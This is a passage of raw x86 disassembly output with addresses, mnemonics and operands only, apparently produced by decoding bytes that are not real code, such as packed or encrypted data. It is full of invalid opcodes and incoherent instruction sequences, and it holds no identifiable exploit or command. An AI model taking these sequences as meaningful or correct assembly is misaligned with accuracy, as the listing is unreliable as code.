  48e9fc:	or     DWORD PTR [ebx+0x171ed75d],ecx
  48ea02:	pop    eax
  48ea03:	mov    cl,0xea
  48ea05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48ea06:	xchg   edi,eax
  48ea07:	pop    edi
  48ea08:	pop    ss
  48ea09:	lods   al,BYTE PTR ds:[esi]
  48ea0a:	sub    esi,DWORD PTR [ecx]
  48ea0c:	sub    BYTE PTR [ebx+0x3f],0xb
  48ea10:	adc    dh,BYTE PTR [ebp-0x1b78e8f3]
  48ea16:	sub    BYTE PTR [esi+0x1],dl
  48ea19:	not    DWORD PTR [edi]
  48ea1b:	inc    ecx
  48ea1c:	pop    es
  48ea1d:	leave  
  48ea1e:	(bad)
  48ea21:	push   cs
  48ea22:	inc    ebp
  48ea23:	inc    ecx
  48ea24:	push   edx
  48ea25:	sub    BYTE PTR [eax],bl
  48ea27:	and    bh,bl
  48ea29:	frstor [esi+0x371fdd70]
  48ea2f:	pop    edi
  48ea30:	pop    ecx
  48ea31:	pop    eax
  48ea32:	sub    DWORD PTR [edx],esp
  48ea34:	pop    ds
  48ea35:	popa   
  48ea36:	xchg   ebx,eax
  48ea37:	mov    cl,0xe
  48ea39:	dec    edi
  48ea3a:	mov    bh,0x66
  48ea3c:	pop    eax
  48ea3d:	xchg   esi,edx
  48ea3f:	sahf   
  48ea40:	fist   WORD PTR [edi]
  48ea42:	pop    ebp
  48ea43:	or     DWORD PTR [ebx-0x5b],0x37
  48ea47:	bound  edi,QWORD PTR [ebx-0x720aa9d6]
  48ea4d:	xchg   edi,eax
  48ea4e:	xchg   edi,eax
  48ea4f:	daa    
  48ea50:	(bad)  
  48ea51:	bound  edx,QWORD PTR [eax-0x6f49a84c]
  48ea57:	ret    0x9a76
  48ea5a:	pop    ss
  48ea5b:	inc    ebx
  48ea5c:	pop    ss
  48ea5d:	arpl   WORD PTR [edx],si
  48ea5f:	add    al,0xef
  48ea61:	xor    edi,DWORD PTR [edi+0x57]
  48ea64:	xor    cl,BYTE PTR [ebx]
  48ea66:	scas   al,BYTE PTR es:[edi]
  48ea67:	hlt    
  48ea68:	dec    ecx
  48ea69:	fbstp  TBYTE PTR [edi]
  48ea6b:	push   edi
  48ea6c:	sub    cl,BYTE PTR [ecx]
  48ea6e:	pop    eax
  48ea6f:	jo     0x48ea5f
  48ea71:	inc    edi
  48ea72:	aaa    
  48ea73:	or     eax,0xa7a419ac
  48ea78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48ea79:	sub    BYTE PTR [eax],dh
  48ea7b:	and    esi,edx
  48ea7d:	mov    bh,0xe7
  48ea7f:	xor    edi,esi
  48ea81:	and    DWORD PTR [eax-0x68e8fb8b],eax
  48ea87:	xor    al,0xb1
  48ea89:	cs popa 
  48ea8b:	xchg   DWORD PTR [eax],ebx
  48ea8d:	mov    cl,0x6a
  48ea8f:	push   0xbfff382f
  48ea94:	sub    eax,esp
  48ea96:	(bad)  
  48ea97:	lods   eax,DWORD PTR ds:[esi]
  48ea98:	xor    dl,BYTE PTR [edi]
  48ea9a:	xchg   DWORD PTR [ecx+0x23],ebp
  48ea9d:	ss or  bl,bh
  48eaa0:	out    dx,eax
  48eaa1:	in     eax,dx
  48eaa2:	shl    BYTE PTR [esi+0x7faf3706],0x18
  48eaa9:	lods   al,BYTE PTR ds:[esi]
  48eaaa:	jbe    0x48eac0
  48eaac:	(bad)  
  48eaad:	cmp    edi,ecx
  48eaaf:	dec    ebx
  48eab0:	lock mov ch,0x9a
  48eab3:	sub    al,0x4f
  48eab5:	sub    DWORD PTR [edx],0x2
  48eab8:	xchg   ebp,eax
  48eab9:	test   al,0x47
  48eabb:	out    0x62,eax
  48eabd:	or     eax,0x7b7d0eb
  48eac2:	cwde   
  48eac3:	ins    DWORD PTR es:[edi],dx
  48eac4:	test   DWORD PTR [edx],ecx
  48eac6:	push   DWORD PTR [edi-0x5a]
  48eac9:	adc    al,BYTE PTR [edx+edi*4]
  48eacc:	inc    edx
  48eacd:	not    DWORD PTR [edx]
  48eacf:	repnz sbb DWORD PTR [ebp-0x22cb6949],0x2f98105b
  48eada:	xlat   BYTE PTR ds:[ebx]
  48eadb:	out    dx,eax
  48eadc:	push   esi
  48eadd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48eade:	je     0x48eb15
  48eae0:	loope  0x48eab5
  48eae2:	pop    es
  48eae3:	cmp    bh,bh
  48eae5:	mov    al,0xa6
  48eae7:	dec    edx
  48eae8:	dec    esp
  48eae9:	aaa    
  48eaea:	jg     0x48eb2f
  48eaec:	mov    al,0x9
  48eaee:	pop    ecx
  48eaef:	call   0x75506a1b
  48eaf4:	pusha  
  48eaf5:	xchg   ebp,eax
  48eaf6:	(bad)  
  48eaf7:	jg     0x48eac0
  48eaf9:	pop    edi
  48eafa:	nop
  48eafb:	loopne 0x48eb03
  48eafd:	and    DWORD PTR [edi-0x76],0x3b2518f0
  48eb04:	idiv   bh
  48eb06:	cmp    eax,DWORD PTR [esi]
  48eb08:	pushf  
  48eb09:	inc    edx
  48eb0a:	pop    ds
  48eb0b:	sti    
  48eb0c:	ss push edx
  48eb0e:	adc    BYTE PTR ds:0x2487af1b,0x3c
  48eb15:	in     eax,dx
  48eb16:	push   edi
  48eb17:	pop    ebx
  48eb18:	out    dx,eax
  48eb19:	rcl    DWORD PTR [ecx-0x5040fb72],cl
  48eb1f:	xor    DWORD PTR ds:0xc8469d,esp
  48eb25:	xor    edi,edx
  48eb27:	xor    al,0x60
  48eb29:	les    eax,FWORD PTR [eax+ebp*2+0x57]
  48eb2d:	popa   
  48eb2e:	frstor [edx]
  48eb30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48eb31:	inc    edi
  48eb32:	xor    eax,0x31d72717
  48eb37:	jno    0x48ebb8
  48eb39:	inc    edx
  48eb3a:	mov    bh,0x45
  48eb3c:	inc    edx
  48eb3d:	sbb    al,ch
  48eb3f:	sbb    ah,BYTE PTR [ecx]
  48eb41:	addr16 mov al,0x2
  48eb44:	pop    esp
  48eb45:	int    0xaf
  48eb47:	xor    cl,bh
  48eb49:	sub    DWORD PTR ds:0x5b0f5624,eax
  48eb4f:	mov    al,ds:0x2fa47142
  48eb54:	mov    DWORD PTR [ebp-0x60f278cb],0x1c124703
  48eb5e:	add    BYTE PTR [esi],bh
  48eb60:	dec    edi
  48eb61:	mov    bh,0x1a
  48eb63:	les    ebx,FWORD PTR [ebx-0x1c]
  48eb66:	dec    ebx
  48eb67:	aaa    
  48eb68:	sub    esp,DWORD PTR [ecx]
  48eb6a:	inc    ebx
  48eb6b:	sbb    al,0x8b
  48eb6d:	outs   dx,DWORD PTR ds:[esi]
  48eb6e:	(bad)  
  48eb6f:	xor    eax,0x569a85d1
  48eb74:	(bad)  
  48eb75:	mov    bh,0x39
  48eb77:	adc    DWORD PTR [eax],ebx
  48eb79:	dec    edx
  48eb7a:	add    DWORD PTR [edi+0x57],esi
  48eb7d:	scas   al,BYTE PTR es:[edi]
  48eb7e:	or     BYTE PTR [ecx],ch
  48eb80:	pusha  
  48eb81:	jg     0x48ebc4
  48eb83:	(bad)  
  48eb84:	and    eax,0x43f630d5
  48eb89:	(bad)  
  48eb8a:	call   0x419f:0x4f884060
  48eb91:	adc    edx,edx
  48eb93:	cmp    ch,BYTE PTR [eax-0x39]
  48eb96:	aaa    
  48eb97:	out    dx,eax
  48eb98:	fld    TBYTE PTR [eax+0x62]
  48eb9b:	sub    eax,0x88e35f2f
  48eba0:	sbb    ch,BYTE PTR [edx-0x6dca009d]
  48eba6:	ror    BYTE PTR [edx-0x5a],0xaf
  48ebaa:	inc    ebx
  48ebab:	and    DWORD PTR [ebx+ebx*1-0x57],ebx
  48ebaf:	addr16 pop ss
  48ebb1:	leave  
  48ebb2:	mov    cl,0x5b
  48ebb4:	xchg   ebp,eax
  48ebb5:	pop    edi
  48ebb6:	push   cs
  48ebb7:	daa    
  48ebb8:	inc    esi
  48ebb9:	jmp    0x45125c4e
  48ebbe:	inc    ebp
  48ebbf:	addr16 push ecx
  48ebc1:	inc    eax
  48ebc2:	in     al,0x18
  48ebc4:	sahf   
  48ebc5:	inc    ebp
  48ebc6:	cmp    eax,DWORD PTR [ebx+eiz*2]
  48ebc9:	xor    eax,0xb6ae6b3f
  48ebce:	cmp    al,BYTE PTR [ebp+0x31b70f45]
  48ebd4:	mov    ah,0x8e
  48ebd6:	pop    esi
  48ebd7:	dec    ebx
  48ebd8:	aaa    
  48ebd9:	inc    ebx
  48ebda:	das    
  48ebdb:	add    eax,0x17335a46
  48ebe0:	into   
  48ebe1:	mov    edi,0x68045857
  48ebe6:	push   edi
  48ebe7:	stos   DWORD PTR es:[edi],eax
  48ebe8:	fild   DWORD PTR [eax+0x3a]
  48ebeb:	jne    0x48ebbb
  48ebed:	(bad)  
  48ebee:	pop    eax
  48ebef:	rcr    edx,1
  48ebf1:	adc    eax,0x27cf39cf
  48ebf6:	adc    dl,bl
  48ebf8:	lods   eax,DWORD PTR ds:[esi]
  48ebf9:	lea    esp,[edi]
  48ebfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48ebfc:	mov    BYTE PTR [ebx+ebp*1],bl
  48ebff:	je     0x48eb90
  48ec01:	ss aaa 
  48ec03:	jns    0x48ec10
  48ec05:	push   0xbb3923b4
  48ec0a:	mov    dh,0x34
  48ec0c:	xchg   BYTE PTR [eax],dl
  48ec0e:	or     al,0x2b
  48ec10:	mov    bh,0xf
  48ec12:	sbb    BYTE PTR ds:0x8f96b18c,dh
  48ec18:	stos   DWORD PTR es:[edi],eax
  48ec19:	or     dl,ah
  48ec1b:	pop    ecx
  48ec1c:	bound  esi,QWORD PTR [edi]
  48ec1e:	ret    0x363a
  48ec21:	dec    eax
  48ec22:	jae    0x48ebb3
  48ec24:	adc    al,0xba
  48ec26:	and    al,0x6c
  48ec28:	aas    
  48ec29:	ja     0x48ebd7
  48ec2b:	fldenv [esi+edx*2]
  48ec2e:	(bad)  
  48ec2f:	out    0x70,eax
  48ec31:	xchg   DWORD PTR [eax],ebx
  48ec33:	xor    eax,0x2d03af67
  48ec38:	sub    BYTE PTR [ebx+0x2b],0xb7
  48ec3c:	das    
  48ec3d:	inc    ebx
  48ec3e:	mov    edi,0x2cc5d8b4
  48ec43:	outs   dx,DWORD PTR ds:[esi]
  48ec44:	inc    esp
  48ec45:	das    
  48ec46:	mov    dh,0x26
  48ec48:	or     DWORD PTR [edi-0x7048ce95],ebp
  48ec4e:	mov    al,0xb6
  48ec50:	inc    eax
  48ec51:	mov    es,WORD PTR [ebp+0x2f]
  48ec54:	add    DWORD PTR [ebp+eax*2+0x6b27f3b0],eax
  48ec5b:	sbb    al,0x71
  48ec5d:	dec    esp
  48ec5e:	xor    ah,BYTE PTR [edi+0x46]
  48ec61:	pop    edi
  48ec62:	cmp    dl,BYTE PTR [edi+ecx*1+0x45678e]
  48ec69:	inc    esp
  48ec6a:	pop    ds
  48ec6b:	lods   eax,DWORD PTR ds:[esi]
  48ec6c:	les    ecx,FWORD PTR [eax]
  48ec6e:	xor    DWORD PTR [edi],esi
  48ec70:	sbb    esi,DWORD PTR [ecx]
  48ec72:	in     al,0xe2
  48ec74:	sbb    BYTE PTR [esi],bl
  48ec76:	aaa    
  48ec77:	inc    esi
  48ec78:	scas   al,BYTE PTR es:[edi]
  48ec79:	cmp    BYTE PTR [esi],bl
  48ec7b:	push   ds
  48ec7c:	ja     0x48ec5d
  48ec7e:	aas    
  48ec7f:	inc    ebp
  48ec80:	lods   al,BYTE PTR ds:[esi]
  48ec81:	jecxz  0x48ecb0
  48ec83:	sbb    BYTE PTR [edi-0x655ee0d1],cl
  48ec89:	adc    BYTE PTR [esi+0x3f],dh
  48ec8c:	aaa    
  48ec8d:	or     WORD PTR [ebx+0xb3b8f49],cx
  48ec94:	mov    edx,edx
  48ec96:	shl    bh,1
  48ec98:	rol    DWORD PTR [ebx+ebp*2],0x35
  48ec9c:	push   edi
  48ec9d:	out    dx,eax
  48ec9e:	xchg   ebx,eax
  48ec9f:	sub    BYTE PTR [ebx+eiz*2-0x41e910e1],ch
  48eca6:	stos   DWORD PTR es:[edi],eax
  48eca7:	pop    edx
  48eca8:	pop    ds
  48eca9:	xor    BYTE PTR [edi+0x4c96b141],ch
  48ecaf:	aam    0xf
  48ecb1:	xor    dl,BYTE PTR [edi]
  48ecb3:	ret    0x6026
  48ecb6:	xchg   edi,eax
  48ecb7:	aaa    
  48ecb8:	pop    es
  48ecb9:	mov    ah,0xa6
  48ecbb:	xor    eax,0x2c0f7bd2
  48ecc0:	and    ah,BYTE PTR [edx+0x13]
  48ecc3:	dec    edi
  48ecc4:	pop    es
  48ecc5:	test   BYTE PTR [esi+0x4a],al
  48ecc8:	cmp    BYTE PTR [esi],bl
  48ecca:	xchg   edi,eax
  48eccb:	mov    WORD PTR [ebp+0x2f],es
  48ecce:	ins    DWORD PTR es:[edi],dx
  48eccf:	imul   eax,DWORD PTR [ebp-0x7d],0xffffffda
  48ecd3:	scas   al,BYTE PTR es:[edi]
  48ecd4:	xor    dh,ah
  48ecd6:	pop    ds
  48ecd7:	scas   eax,DWORD PTR es:[edi]
  48ecd8:	inc    ecx
  48ecd9:	pop    ds
  48ecda:	push   0xff748583
  48ecdf:	aaa    
  48ece0:	push   ds
  48ece1:	outs   dx,DWORD PTR ds:[esi]
  48ece2:	or     al,BYTE PTR [eax+0x58]
  48ece5:	shr    DWORD PTR [edi],0xc3
  48ece8:	popa   
  48ece9:	push   esp
  48ecea:	or     eax,0x6f22dfde
  48ecef:	pop    esp
  48ecf0:	mov    ch,0xcc
  48ecf2:	push   ebp
  48ecf3:	ja     0x48ed29
  48ecf5:	outs   dx,DWORD PTR ds:[esi]
  48ecf6:	cmp    BYTE PTR [ecx-0x48b3bb79],cl
  48ecfc:	pop    DWORD PTR [ecx]
  48ecfe:	out    dx,al
  48ecff:	sub    eax,0xae7b7f36
  48ed04:	lahf   
  48ed05:	pop    eax
  48ed06:	sbb    BYTE PTR ds:0xb6173407,al
  48ed0c:	sub    eax,0xa76fb1b4
  48ed11:	div    DWORD PTR [edi+0x23]
  48ed14:	mov    cl,0x54
  48ed16:	mov    WORD PTR [edi],ss
  48ed18:	out    0x1a,eax
  48ed1a:	imul   ebx,DWORD PTR [eax],0x5c
  48ed1d:	or     esp,esi
  48ed1f:	out    dx,eax
  48ed20:	(bad)  [ecx-0x43]
  48ed23:	rol    BYTE PTR [esi-0x69],cl
  48ed26:	xor    al,0x7
  48ed28:	xor    DWORD PTR [edi],ecx
  48ed2a:	mov    DWORD PTR [ebp-0x3c],eax
  48ed2d:	dec    esp
  48ed2e:	out    dx,eax
  48ed2f:	xor    DWORD PTR [ebx+0x6ad75b6],esp
  48ed35:	pop    ebx
  48ed36:	dec    edi
  48ed37:	mov    edx,DWORD PTR [ebp+0x52]
  48ed3a:	and    dl,BYTE PTR [edx+0x61addfc7]
  48ed40:	mov    ah,0x6d
  48ed42:	inc    ebx
  48ed43:	mov    bh,0xaf
  48ed45:	fcmove st,st(5)
  48ed47:	shl    BYTE PTR [eax-0x18cca831],cl
  48ed4d:	lods   eax,DWORD PTR ds:[esi]
  48ed4e:	xor    eax,0xe7efac58
  48ed53:	add    ebp,0x9fe7175a
  48ed59:	lds    ebp,FWORD PTR [ecx]
  48ed5b:	or     ebx,DWORD PTR [ebx]
  48ed5d:	outs   dx,DWORD PTR ds:[esi]
  48ed5e:	mov    DWORD PTR [esi+0xc],0x8707215c
  48ed65:	push   ebx
  48ed66:	outs   dx,BYTE PTR ds:[esi]
  48ed67:	int3   
  48ed68:	xchg   BYTE PTR [edi],bl
  48ed6a:	aaa    
  48ed6b:	inc    ebp
  48ed6c:	pop    esp
  48ed6d:	loope  0x48eda5
  48ed6f:	ja     0x48ed97
  48ed71:	(bad)  
  48ed73:	mov    al,0xb4
  48ed75:	aam    0xdf
  48ed77:	push   0x44
  48ed79:	sidtd  [eax]
  48ed7c:	outs   dx,DWORD PTR ds:[esi]
  48ed7d:	adc    eax,0x4790c7db
  48ed82:	add    esi,DWORD PTR [edx+0x3e]
  48ed85:	xor    BYTE PTR [eax],dh
  48ed87:	div    DWORD PTR [eax]
  48ed89:	sbb    esi,DWORD PTR [esi+0x5739b902]
  48ed8f:	xor    BYTE PTR [edi+0x69],al
  48ed92:	aad    0xa0
  48ed94:	inc    esi
  48ed95:	das    
  48ed96:	js     0x48ed9b
  48ed98:	nop
  48ed99:	mov    eax,ds:0xb46f4317
  48ed9e:	leave  
  48ed9f:	aam    0x22
  48eda1:	dec    edi
  48eda2:	sbb    ecx,DWORD PTR [edx]
  48eda4:	lods   al,BYTE PTR ds:[esi]
  48eda5:	sub    edx,eax
  48eda7:	pop    ss
  48eda8:	pop    ss
  48eda9:	push   edi
  48edaa:	pop    ebx
  48edab:	mov    cl,0x61
  48edad:	nop
  48edae:	mov    ds,edi
  48edb0:	xchg   edi,eax
  48edb1:	pop    ss
  48edb2:	cmp    DWORD PTR [eax-0x46],ebp
  48edb5:	frstor [esi]
  48edb7:	jg     0x48edeb
  48edb9:	pop    ss
  48edba:	xor    DWORD PTR [ebp-0x53],esi
  48edbd:	nop
  48edbe:	sub    esi,DWORD PTR [ecx]
  48edc0:	pop    ss
  48edc1:	add    al,BYTE PTR [ebx-0x6d]
  48edc4:	mov    eax,ds:0xc60b397f
  48edc9:	adc    ebp,eax
  48edcb:	mov    dl,BYTE PTR [edi]
  48edcd:	inc    esp
  48edce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48edcf:	adc    eax,0x13bf75bc
  48edd4:	addr16 mov bh,0x9e
  48edd7:	ds jo  0x48ed7f
  48edda:	pop    edi
  48eddb:	(bad)  
  48eddc:	scas   eax,DWORD PTR es:[edi]
  48eddd:	mov    bl,bl
  48eddf:	ds (bad) 
  48ede1:	(bad)  
  48ede2:	lahf   
  48ede3:	cmp    DWORD PTR [edx],0x49
  48ede6:	(bad)  
  48ede7:	cmp    dh,ch
  48ede9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48edea:	pop    ss
  48edeb:	push   ebx
  48edec:	sub    ecx,DWORD PTR ds:0xb5a707a4
  48edf2:	or     BYTE PTR [ebx+0x374f0fb5],ch
  48edf8:	xor    al,0xa6
  48edfa:	sub    esp,DWORD PTR [eax]
  48edfc:	mov    edi,0x6f097f36
  48ee01:	or     DWORD PTR [edi+eax*1+0x32],0x5232520b
  48ee09:	add    DWORD PTR [esi+0x46],esp
  48ee0c:	inc    ecx
  48ee0d:	or     DWORD PTR [edi+0x18],ebx
  48ee10:	adc    eax,DWORD PTR [edi+0x1b]
  48ee13:	sub    BYTE PTR ds:0x47178d11,0x4f
  48ee1a:	daa    
  48ee1b:	adc    dl,cl
  48ee1d:	mov    edx,0x615fbbb1
  48ee22:	les    eax,FWORD PTR [edx+ecx*1-0x51]
  48ee26:	das    
  48ee27:	mov    BYTE PTR [esp+esi*2+0x28],al
  48ee2b:	outs   dx,DWORD PTR ds:[esi]
  48ee2c:	push   edi
  48ee2d:	xchg   edi,eax
  48ee2e:	dec    eax
  48ee2f:	jb     0x48edd4
  48ee31:	mov    DWORD PTR [ebx+ecx*1-0x5c],0xbf645c22
  48ee39:	xchg   edi,eax
  48ee3a:	dec    DWORD PTR [eax]
  48ee3c:	outs   dx,BYTE PTR ds:[esi]
  48ee3d:	adc    DWORD PTR [ebx+ebp*2+0x6e],ecx
  48ee41:	pop    ds
  48ee42:	adc    eax,0xe730955d
  48ee47:	xor    BYTE PTR [edi],ch
  48ee49:	xchg   edx,eax
  48ee4a:	rcl    ch,0x84
  48ee4d:	ja     0x48ee87
  48ee4f:	mov    ds:0xcf512a75,al
  48ee54:	jg     0x48ee6d
  48ee56:	mov    dh,0xe3
  48ee58:	cmp    al,0xc0
  48ee5a:	sbb    esi,DWORD PTR [edx]
  48ee5c:	lahf   
  48ee5d:	(bad)
  48ee61:	mov    cl,0xeb
  48ee63:	pop    es
  48ee64:	or     esp,DWORD PTR [esi]
  48ee66:	xlat   BYTE PTR ds:[ebx]
  48ee67:	push   esi
  48ee68:	daa    
  48ee69:	xchg   DWORD PTR [ecx+0x47],eax
  48ee6c:	bound  ecx,QWORD PTR [ecx]
  48ee6e:	(bad)  [edx-0x79]
  48ee71:	dec    ebx
  48ee72:	xor    edi,ebp
  48ee74:	push   0xffffffc9
  48ee76:	jo     0x48ee9c
  48ee78:	(bad)  
  48ee79:	aaa    
  48ee7a:	dec    ebx
  48ee7b:	(bad)  
  48ee7c:	dec    edx
  48ee7d:	cmp    al,0xcf
  48ee7f:	mov    eax,edi
  48ee81:	(bad)  
  48ee82:	cmp    cl,BYTE PTR [esi]
  48ee84:	jbe    0x48eef5
  48ee86:	das    
  48ee87:	(bad)  
  48ee88:	outs   dx,DWORD PTR ds:[esi]
  48ee89:	xor    esi,edi
  48ee8b:	push   es
  48ee8c:	mov    ebx,0x9fffc7d4
  48ee91:	inc    edi
  48ee92:	push   esp
  48ee93:	(bad)  
  48ee94:	aad    0x80
  48ee96:	mov    bh,0x31
  48ee98:	out    0x74,eax
  48ee9a:	loope  0x48eedd
  48ee9c:	dec    eax
  48ee9d:	das    
  48ee9e:	aaa    
  48ee9f:	sub    al,0xe4
  48eea1:	mov    gs,WORD PTR [esi-0x59]
  48eea4:	xor    dh,bh
  48eea6:	inc    ecx
  48eea7:	mov    esi,0xd744aad1
  48eeac:	inc    esi
  48eead:	mov    esi,DWORD PTR [ebx]
  48eeaf:	add    BYTE PTR [esi],cl
  48eeb1:	mov    ?,WORD PTR [edx]
  48eeb3:	jg     0x48eef9
  48eeb5:	mov    edi,0xc5853ab0
  48eeba:	pop    edi
  48eebb:	psubsw mm5,QWORD PTR [ecx-0x2b]
  48eebf:	mov    ch,0x97
  48eec1:	sub    edi,DWORD PTR [edi]
  48eec3:	pop    edx
  48eec4:	add    DWORD PTR [esi+0x45],eax
  48eec7:	iret   
  48eec8:	pop    edi
  48eec9:	adc    eax,0x37c76b50
  48eece:	aas    
  48eecf:	jg     0x48ef3f
  48eed1:	ret    0x6026
  48eed4:	xor    esp,DWORD PTR [edi]
  48eed6:	cmp    DWORD PTR [eax+eiz*4],esi
  48eed9:	and    al,0xf1
  48eedb:	jnp    0x48ef24
  48eedd:	sbb    bh,BYTE PTR ss:[eax+0x37328f18]
  48eee4:	jnp    0x48ef3d
  48eee6:	dec    esp
  48eee7:	xor    edi,edx
  48eee9:	ss mov ebx,0xde17c739
  48eeef:	mov    edx,0x673ed2f0
  48eef4:	fild   QWORD PTR [ebx+0x3ee36d56]
  48eefa:	pop    ss
  48eefb:	jg     0x48eef6
  48eefd:	ror    BYTE PTR [esi+0x53],0xb
  48ef01:	xchg   edx,eax
  48ef02:	inc    esp
  48ef03:	imul   eax,edi,0xffffff82
  48ef06:	ins    DWORD PTR es:[edi],dx
  48ef07:	dec    ebx
  48ef08:	pop    es
  48ef09:	jg     0x48ee95
  48ef0b:	ror    DWORD PTR [edx],1
  48ef0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48ef0e:	fild   WORD PTR [ebx-0x19]
  48ef11:	retf   0xb7cb
  48ef14:	je     0x48ef06
  48ef16:	fimul  WORD PTR [edi-0x46f45029]
  48ef1c:	inc    edi
  48ef1d:	lods   eax,DWORD PTR ds:[esi]
  48ef1e:	push   0x2f
  48ef20:	cmp    esi,DWORD PTR [edi]
  48ef22:	xchg   esp,eax
  48ef23:	pop    ss
  48ef24:	fdiv   DWORD PTR [esi+0x23]
  48ef27:	das    
  48ef28:	mov    edi,0x6b51ad33
  48ef2d:	xor    BYTE PTR [edi+0x7],bl
  48ef30:	fidiv  DWORD PTR [esi+ecx*4-0x30cd407f]
  48ef37:	(bad)  
  48ef38:	adc    DWORD PTR [eax+eax*1],ebx
  48ef3b:	xchg   edi,eax
  48ef3c:	inc    edi
  48ef3d:	jg     0x48ef9e
  48ef3f:	xor    eax,0x431ad587
  48ef44:	rcr    DWORD PTR [edi-0x457a27f4],cl
  48ef4a:	xchg   WORD PTR [edi+ebx*4+0x6],ax
  48ef4f:	and    al,0xd8
  48ef51:	push   ss
  48ef52:	pop    es
  48ef53:	push   edi
  48ef54:	mov    bh,0x4f
  48ef56:	pop    eax
  48ef57:	add    edx,DWORD PTR [esi-0x2f]
  48ef5a:	aaa    
  48ef5b:	aaa    
  48ef5c:	push   edx
  48ef5d:	jo     0x48efc3
  48ef5f:	ins    DWORD PTR es:[edi],dx
  48ef60:	mov    bh,0xb
  48ef62:	pop    esi
  48ef63:	inc    ecx
  48ef64:	xor    DWORD PTR [esi+0x72],eax
  48ef67:	add    BYTE PTR [edi+eiz*4-0x70],al
  48ef6b:	xchg   ecx,eax
  48ef6c:	pop    ds
  48ef6d:	pop    eax
  48ef6e:	div    DWORD PTR [eax]
  48ef70:	inc    ebx
  48ef71:	aad    0x81
  48ef73:	lea    eax,[esi+0x7]
  48ef76:	out    dx,eax
  48ef77:	leave  
  48ef78:	dec    esp
  48ef79:	cmp    dl,bl
  48ef7b:	xor    al,0x6f
  48ef7d:	inc    ecx
  48ef7e:	out    dx,eax
  48ef7f:	xor    dh,BYTE PTR [eax+0x11]
  48ef82:	fcom   DWORD PTR [esi+0x6f]
  48ef85:	dec    edi
  48ef86:	or     BYTE PTR [ebx+0x17af6091],cl
  48ef8c:	jbe    0x48effa
  48ef8e:	pop    edx
  48ef8f:	add    edi,esp
  48ef91:	inc    edi
  48ef92:	ror    DWORD PTR [edx+0x76e91d21],cl
  48ef98:	fwait
  48ef99:	(bad)
  48ef9d:	rcl    DWORD PTR [edi-0xb4e9e81],cl
  48efa3:	mov    al,0x67
  48efa5:	inc    edi
  48efa6:	pop    edi
  48efa7:	aad    0x25
  48efa9:	imul   esi,DWORD PTR ds:0xb170877f,0x45b3a661
  48efb3:	mov    bh,0x3f
  48efb5:	(bad)  
  48efb6:	cmp    al,BYTE PTR [edx-0x49]
  48efb9:	daa    
  48efba:	scas   eax,DWORD PTR es:[edi]
  48efbb:	aam    0x2c
  48efbd:	bound  ecx,QWORD PTR [ebp-0x11]
  48efc0:	mov    edi,0x81c182d1
  48efc5:	inc    edi
  48efc6:	das    
  48efc7:	push   edi
  48efc8:	add    al,0xad
  48efca:	fcomp  DWORD PTR [eax+0xf]
  48efcd:	in     al,0xea
  48efcf:	mov    dh,0x70
  48efd1:	not    DWORD PTR [edi+0x70580e34]
  48efd7:	test   eax,0xe64bb7ff
  48efdc:	xor    ch,BYTE PTR [esi-0x45cff0be]
  48efe2:	mov    DWORD PTR [ebp+0x11],esi
  48efe5:	aaa    
  48efe6:	scas   eax,DWORD PTR es:[edi]
  48efe7:	lea    ecx,[ebp-0x3c]
  48efea:	ror    BYTE PTR [edi+0x30],0xe7
  48efee:	sub    eax,0xc76d4070
  48eff3:	inc    ecx
  48eff4:	push   0xffffff94
  48eff6:	xchg   ebp,eax
  48eff7:	sub    BYTE PTR [ebp+0x77],ch
  48effa:	ret    0x42b8
  48effd:	jmp    0x48efde
  48efff:	xor    eax,DWORD PTR [esi+eax*1-0x1f]
  48f003:	sub    esi,DWORD PTR [ecx]
  48f005:	ja     0x48efe6
  48f007:	xchg   edx,edx
  48f009:	and    edx,DWORD PTR [esi-0x4b]
  48f00c:	aaa    
  48f00d:	dec    ebx
  48f00e:	shr    BYTE PTR [edx],cl
  48f010:	mov    ebx,cs
  48f012:	addr16 mov bh,0xe1
  48f015:	cs test ebp,edx
  48f018:	jg     0x48efc9
  48f01a:	test   DWORD PTR [eax+0x78],0xf79f162b
  48f021:	pop    eax
  48f022:	dec    eax
  48f023:	and    esi,DWORD PTR [edi+edi*8+0x6b0dc17f]
  48f02a:	push   ecx
  48f02b:	pop    DWORD PTR [edi]
  48f02d:	xchg   ecx,eax
  48f02e:	push   ss
  48f02f:	add    eax,DWORD PTR [ebp+0x6a8ee7bf]
  48f035:	sbb    bl,BYTE PTR [eax]
  48f037:	dec    edi
  48f038:	ss mov al,0x26
  48f03b:	sbb    cl,BYTE PTR [ebx+0x5aed7f27]
  48f041:	lea    esi,[edx-0x3a456061]
  48f047:	inc    edx
  48f048:	mov    dh,0x87
  48f04a:	test   DWORD PTR [edi],0xfc07816
  48f050:	sub    al,0x57
  48f052:	aaa    
  48f053:	inc    edx
  48f054:	addr16 pop eax
  48f056:	mov    ds:0xafe7d58d,eax
  48f05b:	cmp    ecx,DWORD PTR [eax+0x47e74355]
  48f061:	xor    cl,al
  48f063:	inc    eax
  48f064:	or     DWORD PTR [edi+0x34],edi
  48f067:	enter  0x8c43,0x80
  48f06b:	xlat   BYTE PTR ds:[ebx]
  48f06c:	cmp    DWORD PTR [eax],eax
  48f06e:	xor    al,BYTE PTR [ebx*4+0x3f463046]
  48f075:	dec    esi
  48f076:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48f077:	or     al,BYTE PTR [edx]
  48f079:	fwait
  48f07a:	fwait
  48f07b:	outs   dx,DWORD PTR ds:[esi]
  48f07c:	jbe    0x48f032
  48f07e:	mov    eax,0x3fd3bf2d
  48f083:	inc    ebp
  48f084:	lods   al,BYTE PTR ds:[esi]
  48f085:	add    al,0x7
  48f088:	adc    edx,DWORD PTR [ebp+0x31972b8c]
  48f08e:	out    0x43,eax
  48f090:	mov    dh,0x83
  48f092:	je     0x48f0de
  48f094:	imul   DWORD PTR [ebx]
  48f096:	jg     0x48f073
  48f098:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48f099:	push   ebp
  48f09a:	fsubr  DWORD PTR [edi+0x47]
  48f09d:	retf   
  48f09e:	daa    
  48f09f:	mov    ebx,0xff4d6065
  48f0a4:	(bad)  
